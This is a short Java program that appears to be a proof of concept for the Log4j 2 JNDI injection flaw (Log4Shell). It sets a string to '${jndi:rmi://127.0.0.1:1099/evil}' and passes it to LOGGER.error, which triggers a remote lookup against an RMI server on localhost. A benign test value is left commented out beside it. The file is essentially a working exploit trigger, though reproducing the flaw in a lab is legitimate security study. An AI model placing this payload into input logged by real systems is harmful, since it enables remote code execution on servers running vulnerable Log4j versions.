import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {

        String name = "${jndi:rmi://127.0.0.1:1099/evil}";
//        String name = "ceshi";

        LOGGER.error("hello,{}",name);

    }
}
